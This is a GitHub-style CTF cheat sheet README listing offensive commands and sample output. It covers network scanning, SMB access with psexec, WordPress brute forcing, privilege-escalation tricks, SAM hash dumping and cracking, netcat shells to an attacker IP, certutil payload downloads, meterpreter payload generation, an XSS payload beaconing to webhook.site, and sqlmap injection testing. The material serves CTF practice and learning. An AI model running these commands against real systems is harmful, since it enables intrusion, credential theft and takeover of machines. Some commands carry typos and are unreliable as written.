# Awesome Ctf Cheatsheet [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)

> A currated list of all capture the flag tips and strategies.

## System Hacking
* To scan for systems and Open Services/Ports, Use Nmap
  * `namp -sV <HOST_IP>`
  * `nmap --script vuln <HOST_IP>`  -- Useful for getting Vulnerabilities on system
  * `nmap -sS -T4 -A -p- <HOST_IP>` -- Useful for All Ports, SYN Scan and OS detection
  * `nmap --script ssl-enum-ciphers -p 443  <HOST_IP>` -- Gives rating for SSL Ciphers
* To passively discover machines on the network, Use Netdiscover
  ```
  root@kali:~# netdiscover -i eth0
  Currently scanning: 192.168.17.0/16   |   Screen View: Unique Hosts                                                           3 Captured ARP Req/Rep packets, from 8 hosts.   Total size: 480                                                               _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
  -----------------------------------------------------------------------------
  192.168.1.1     11:22:33:44:55:66      1      60  NETGEAR                                                                                           
  192.168.1.2     21:22:33:44:55:66      1      60  Apple, Inc.                                                                                      
  192.168.1.8     41:22:33:44:55:66      1      60  Intel Corporate                                                           
  ```
  
* To scan for vulnerabilities use nikto.
  * Command to run : `nikto -h <HOST_IP>`
  
* If port 80 is open, use robots.txt to find any hidden flags.
* If Anonymous SMB is open, we can mount shares.
  ```
  root@kali:~/CTF# mkdir /mnt/smb
  root@kali:~/CTF# mount -t cifs //<REMOTE_SMB_IP>/<SHARE> /mnt/smb/
  Password for root@//<HOST_IP>/<SHARE>: 
  ```
* If we found Administrator Credentials for SMB, Access the root shell using this method.
  ```
  root@kali:/opt/impacket/examples# smbmap -u administrator -p password -H <HOST_IP>
  [+] Finding open SMB ports....
  [+] User SMB session establishd on <HOST_IP>...
  [+] IP: <HOST_IP>:445	Name: <HOST_IP>                                      
	 Disk                                                  	Permissions
	 ----                                                  	-----------
	 ADMIN$                                            	READ, WRITE
	 Backups                                           	READ, WRITE
	 C$                                                	READ, WRITE
	 IPC$                                              	READ ONLY
  root@kali:/opt/impacket/examples# python psexec.py administrator@<HOST_IP>
  Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

  Password:
  [*] Requesting shares on <HOST_IP>.....
  [*] Found writable share ADMIN$
  [*] Uploading file tJJmcVQN.exe
  [*] Opening SVCManager on <HOST_IP>.....
  [*] Creating service RKAe on <HOST_IP>....
  [*] Starting service RKAe.....
  [!] Press help for extra shell commands
  Microsoft Windows [Version 10.0.14393]
  (c) 2016 Microsoft Corporation. All rights reserved.

  C:\Windows\system32>
  ```
  
* To view files on VHD drie, use `7z l <FILENAME>.vhd`
  ```
  root@kali:/mnt/smb# 7z l <VHD_NAME>.vhd
  7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
  p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz (306D4),ASM,AES-NI)
  Scanning the drive for archives:
  1 file, 5418299392 bytes (5168 MiB)
  Listing archive: <VHD_NAME>.vhd
  ```
* To mount VHD drive on Linux use, very useful for forensics
  ```
  root@kali:/mnt/smb# guestmount --add <VHD_NAME>.vhd --inspector -ro -v /mnt/vhd
  ```
* To Find server version of Webserver
  * `curl --header <SERVER_IP>`
* If we want to find exploit of a particular version, Use searchsploit
  * `searchsploit apache 1.2.4`
* If /wp-login.php is found in the Vulnerability scanning, it can be Wordpress site.
* Use Hydra to bruteforce username after capturing the login request using Burpsuite.
  * `hydra -V -l wordlist.dic -p 123 <HOST_IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username`
* To scan Wordpress Website for known vulnerabilities. 
  * `gem install wpscan`
  * `wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic`
* We can use metasploit to exploit the server
  * use exploit/unix/webapp/wp_admin_shell_upload 
  * pentestmonkey.net/tools/web-shells/php-reverse-shell
* Command to get Bash shell
  * `python -c "import pty;pty.spawn('/bin/bash')"`
* Privilige Escalation: Now if we found the hash for the priviliged user, we can use crackstation.net/ to get the password.
* To find all the files which current user can interact use the command
  * `find / -perm -4000 2>/dev/null`
* If there is any program which we can get to use as root, we need to target that.
  ```
  robot@linux:/$ nmap --interactive
  nmap --interactive
  Starting nmap V. 3.81 ( www.insecure.org/nmap/ )
  Welcome to Interactive Mode -- press h <enter> for help
  nmap> !sh
  !sh
  # id
  id
  uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
  ```
* If we got access to VIM (MAN Pages), we can run `!<Command>` to execute directly in the shell.
* If we want to run old 16bit or 32bit windows program, we can use www.dosbox.com, an emulator which can be installed on Windows.
* If RPC is open, we can use the following to login
  * `rpcclient -U "" <HOST_IP>` -- If this is success without password, we can login using null session.
* If SMB is open, we can use the following command to try connecting
  * `smbclient -L \\\\<HOST_IP>`

## Web Hacking
## 5 Stages of Hacking
* Reconnaissance
* Scanning and Enumeration
* Gaining Access
* Maintaining Access
* Covering Tracks
  
### RECONNAISSANCE
#### TOOLS
* Whois, Nslookup, Dnsrecon, Google Fu, Dig
* [Sublist3r](https://github.com/aboul3la/Sublist3r) 
* Bluto,[crt.sh](http://crt.sh)
* [Hunter.io](https://hunter.io/) - Gather Email about a Company.
* Fingerprinting : Nmap, Wappalyzer, Whatweb, Builtwith, Netcat
* Data breaches : HaveIbeenPwned
* Use foxy Proxy Firefox adddon for switching for Burp Suite
* Use scope filter with this filter `.*\.irobot\.com$`
* Use [SecurityHeaders](https://securityheaders.com/) to find some misconfigured header information on target website.
* Use Zap Proxy tool to extract hidden files/directories.
* Clear Text Passwords [Link](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis)
* `theharvester -d microsoft.com -l 200 -g -b google` Gather Information

### SCANNING
* `nmap -sn <NETWORK>` -- Ping Sweep
* `nmap -T4 <NETWORK>` -- SYN Scan with Speed of 4 and port of common 1000 TCP
* `nmap -T4 -A -p- <NETWORK>` -- All Port scan with All Scanning including OS, Version, Script and Traceroute.
* `nmap -sU -T4 <NETWORK>` -- UDP Ports, Dont scan all scans, as it takes lot of time.


### Payloads
* `windows/meterpreter_reverse_tcp` is Non Staged Payload
* `windows/meterpreter/reverse_tcp` is  Staged Payload

### SHELL
* Reverse Shell
* Bind Shell : `nc <ATTACKER_IP> <ATTACKET_PORT>`, to listen : `nc -lvp <ATTACKER_PORT>`

## File Hacking
* If something is hidden on a pdf which we need to find, we can Press Ctrl + A to copy everything on the pdf and paste on notepad.
  * If nothing is found, we can use [Inkspace tool](https://inkscape.org) to paste the pdf and try to ungroup several times to extract any hidden flag.
  * We can even solve using pdf-uncompress tools like qpdf to convert compressed data to redeable format and solve from there.
* If there is `PK` at the start of the file in the magic bytes, its most probably `ZIP` File.
* If there is recursive ZIP File, we can use the following command `binwalk -Me <FILE_NAME>`.
* If EXE file is having some hidden text, we can use hexeditor or strings to locate the flag.
* If hidden text has == at the end, it is base64 encoded.
* We can use Strace to track all application calls.
  * Command: `strace -s -f 12345 -e trace=recv,read <PROGRAM>`
* We can use ltrace to track all app + library calls.
  * Command: `ltrace ./<PROG_NAME>`

## Cryptography
* If there is word `caesar` in the question or hint, this can be a substitution cipher.
  * Use this website [Link](https://www.guballa.de/vigenere-solver) for breaking Vigenère ciphers without knowing the key.
* If you find `!` in the cipher text and cipher seems to be within certain range of Letters and appears to be transposition of a plain text, Use this website [Ceasar Box](https://www.dcode.fr/caesar-box-cipher)w.dcode.fr/caesar-cipher to Bruteforce the hidden message.
* To solve One Time Pad : [OTP](http://rumkin.com/tools/cipher/otp.php)


## Forensics
* If there is a image given, try `file` comamnd on the image to learn more information.
* Binwalk to find data inside the image or sometimes if binwalk reports as zip Archive, we can rename the file to <FILE_NAME>.zip to find interesting data.
  * Command `binwalk <IMAGE_NAME>`
* If there is ntfs file,extract with 7Zip on Windowds. If there is a file with alternative data strems, we can use the command `dir /R <FILE_NAME>` and then we can this command to extract data inside it `cat <HIDDEN_STREAM> > asdf.<FILE_TYPE>`
* Method to extract ntfs in Linux : `sudo mount -o loop <FILENAME.ntfs> mnt`
* To extract data from Image files, we can use `zsteg <FILE_NAME>`
* JavaScript Deobfuscator [Jsnice](http://www.jsnice.org/) 
* To check metadata `exiftool <FILE_NAME>`
* GrepToWin : `strings <FILE_NAME> | grep flag{`
* StegHide `steghide extract -sf <FILE_NAME>`

## Password Cracking
* If there is `JOHN` in the title/text/hint, its mostly reference to `JOHN the ripper` for bruteforce passwords/hashes.
  * Command : `./john -show <PASS_FILE>`
  * Better Command : `john output.hash --wordlist=/usr/share/wordlists/rockyou.txt`
* To crack Well known Hashes (CTF Related Password Cracking),use [Link](hashes.org)
* To get System User Hashes, we can follow this method
  ```
  root@kali:/mnt/vhd/Windows/System32/config# cp SAM SYSTEM ~/CTF/
  root@kali:/mnt/vhd/Windows/System32/config# cd ~/CTF/
  root@kali:~/CTF# ls
  SAM  SYSTEM  
  root@kali:~/CTF# mkdir Backup_dump
  root@kali:~/CTF# mv SAM SYSTEM Backup_dump/
  root@kali:~/CTF# cd Backup_dump/
  root@kali:~/CTF/Backup_dump# ls
  SAM  SYSTEM
  root@kali:~/CTF/Backup_dump# impacket-secretsdump -sam SAM -system SYSTEM local
  Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

  [*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  User:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
  [*] Cleaning up... 
  ```
* If we able to extract /etc/passwd and /etc/shadow file we can use
  * Command : `unshadow <PASSWD> <SHADOW>`
  * Use Hashcat to crack the password, here 500 is for format `$1$` Replace it accordingly.
  ```
  hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
  ```
  
## Privilige Escalation
* [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
* [Lin Enum Script](https://github.com/rebootuser/LinEnum)
* [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
* To Use DirtyCow : [Link](https://dirtycow.ninja/) -- Maybe more specifically : [Dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
* Trick to paste code in VI, with format on remote machines `set paste`
* Try `sudo -l` to check what can be run with no-password.
* For windows:
  * In meterpreter shell try `getsystem`
  * In meterpreter shell try `background` and then follow rest of commands.
  * search suggester
  * `use post/multi/recon/local_exploit_suggestor` (Example only)
  * `show options`
  * `set session 1`
  * `run`
  * If worked fine, else Try follow rest of commands.
  * Use this link: [FuzzySec Win Priv Exec](https://www.fuzzysecurity.com/tutorials/16.html)
  * Use this method: [Sherlock](https://github.com/rasta-mouse/Sherlock)
  * If current process doesnt own Privs, use `migrate <PID>` to get more Priviliges in Meterpretor.
* For Linux:
  * If `sudo -l` gives something like this.
  ```
  User www-data may run the following commands on bashed:
    (enemy : enemy) NOPASSWD: ALL
  ```
  We can try like below
  ```
  $ sudo -u enemy /bin/bash
  id
  uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
  ```
* To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
  ```
  root# /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333 
  [*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...
  root# msfconsole -r unicorn.rc 
  [*] Started reverse TCP handler on <HOST_IP>:3333 
  msf5 exploit(multi/handler) >         
  ```
* Get Shell from MYSQL
  ```
  mysql> \! /bin/sh
  ```
  
* To get Root from VI
  ```
  www-data@enemy:$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
  ```
  or
  ```
  www-data@enemy:$ sudo /usr/bin/vi /var/www/html/anyrandomFile
  Type Escape and enter :!/bin/bash
  ```
* Use [Pspy](https://github.com/DominicBreuker/pspy) for Getting information on cron, proceses etc.
* If some system cron is getting some url present in the file, we can replace url to get flag as below.
  ```
  root@kali:~/admin-area$ cat input 
  url = "file:///root/root.txt"
  ```
* Lot of Privilige Exec Depends on Cronjobs and to monitor use, we can tail the logs for sometime to observe the actions.
  ```
  sun@kali:~/Documents$ tail -f /var/log/syslog
  Nov 18 23:55:01 sun CRON[5327]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
  Nov 19 00:00:01 sun CRON[5626]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
  Nov 19 00:00:01 sun CRON[5627]: (sun) CMD (nodejs /home/sun/server.js >/dev/null 2>&1)
  Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
  ```
* If we dont exactly remember how to use a given setuid command to get Privliges, use [Gtfobins](https://gtfobins.github.io/)
* If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode and enter `!/bin/bash` to get root shell
  ```
  user@kali:~/bin$ cat new.sh 
  #!/bin/bash
  /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
  
  root@kali:~/bin$ sh new.sh 
  -- Logs begin at Sun 2019-11-17 19:19:25 EST, end at Mon 2019-11-18 17:13:44 EST. --
  Nov 18 17:02:26 kali sudo[11538]: pam_unix(sudo:auth): authentication failure; logname= uid=33 eu
  Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): conversation failed
  Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): auth could not identify password for [www-
  Nov 18 17:02:29 kali sudo[11538]: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=
  Nov 18 17:02:29 kali crontab[11595]: (www-data) LIST (www-data)
  !/bin/bash
  root@kali:/home/david/bin# 
  ```
* To get the best Shell after taking control of the system
  ```
  www-data@machine:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
  <html$ python3 -c "import pty;pty.spawn('/bin/bash')"                        
  www-data@machine:/var/www/html$ ^Z
  [1]+  Stopped                 nc -nlvp 443
  root@kali:# stty raw -echo
  ----------------------Here we need to type `fg` and press Enter `Twice`
  root@kali:# nc -nlvp 443 
  www-data@machine:/var/www/html$ TERM=xterm
  ```
  
## Tools
* Reconnoitre [Links](https://github.com/codingo/Reconnoitre) -- A security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
  * `reconnoitre -t 10.10.10.37 -o `pwd` --services`
* Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
* CTF Exploitation Framework : GitHub.com/Gallopsled/pwntools `pip install pwntools`
* When using GDB, we can create "~/.gdbinit" file and add this line "set disassembly-flavor intel" to make intel synatx.
* Dirbuster for enumeration web server Attacks.
* [Gobuster](https://github.com/OJ/gobuster) - Used for advanced enumeration.
* [Nmap Automator](https://github.com/21y4d/nmapAutomator)
* 7z Password Cracking: Use tool `7z2john`
* SSH Password Cracking: `/usr/share/john/ssh2john.py id_rsa > output.hash`
* [Quipqiup - Substitution Cipher Solver](https://quipqiup.com/)
* [GDB Peda](https://github.com/longld/peda)
* [Search Code - Based on Funcion name and code-snippet](https://searchcode.com/)


### Recover Files from Deleted File Systems
* To Extract Flag from the file system - `strings /dev/sdb`
* Flag Recovery with regex `grep -a '[a-z0-9]\{32\}' /dev/sdb`
* `ssh username@remote_address "sudo dcfldd -if=/dev/sdb | gzip -1 ." | dcfldd of=extract.dd.gz` -- Used to get from Remote Hosts
* `gunzip -d extract.dd.gz`
* `binwalk -Me extract.dd`

### Transfer Files from Host to Target Machine
* Use `python -m SimpleHTTPServer` in the host folder.
* Use Apache and put files in `/var/www/html/` folder.
* If Tomcat is Opened, upload the file/payload using the Admin panel.
* If wordpress is running, upload the file as plugin.
* In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`

### Powershell
* To bypass execution policy `powershell.exe -exec bypass`

### BufferOverflow
* To generate shellcode quickly, we can use.
  * `python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh))`
  * `(python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh()))" ;cat) | ./vuln`
 
### XSS Attack
* If there is a website, with a text field to submit, we can try XSS Attack.
  * Use any online HTTP Bin website like https://webhook.site/#!/
  - ``` ""> <img src="https://webhook.site/19df1f1a-2ec8-453e-b85b-ed2cab66a5cc>"```
  
### Packet Capture
* If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
  * Example Command : `tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields`

### Gobuster with Cookie (Useful to directory traversal when cookie is needed )
```root@kali:# gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -c PHPSESSID=<COOKIE_VALUE>
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://<IP_ADDRESS>
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Cookies:        <COOKIE_VALUE>
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/19 01:43:01 Starting gobuster
===============================================================
/home.php (Status: 302)
/index.php (Status: 200)
```

### SQL MAP Usage
Redirect the HTTP Request to Burpsuite and we can see the request like this.
```
POST / HTTP/1.1
Host: 10.10.10.162
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.10.10.162/
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Connection: close
Upgrade-Insecure-Requests: 1

search=help
```
Now Right click and click on `copy to file` option.
```
root@kali:/SqlMap# sqlmap -r search.req --batch --force-ssl
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:25:16 /2020-04-19/

[01:25:16] [INFO] parsing HTTP request from 'search.req'
[01:25:17] [INFO] testing connection to the target URL
[01:25:17] [INFO] checking if the target is protected by some kind of WAF/IPS
[01:25:17] [INFO] testing if the target URL content is stable
[01:25:18] [INFO] target URL content is stable
[01:25:18] [INFO] testing if POST parameter 'search' is dynamic
[01:25:18] [WARNING] POST parameter 'search' does not appear to be dynamic
[01:25:18] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[01:25:19] [INFO] testing for SQL injection on POST parameter 'search'
[01:25:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[01:25:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[01:25:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[01:25:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
```

## Contribute

Contributions welcome! Read the [contribution guidelines](contributing.md) first.


## License

[![CC0](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/cc-zero.svg)](https://creativecommons.org/publicdomain/zero/1.0)

To the extent possible under law, SaiKiran Uppu has waived all copyright and
related or neighboring rights to this work.
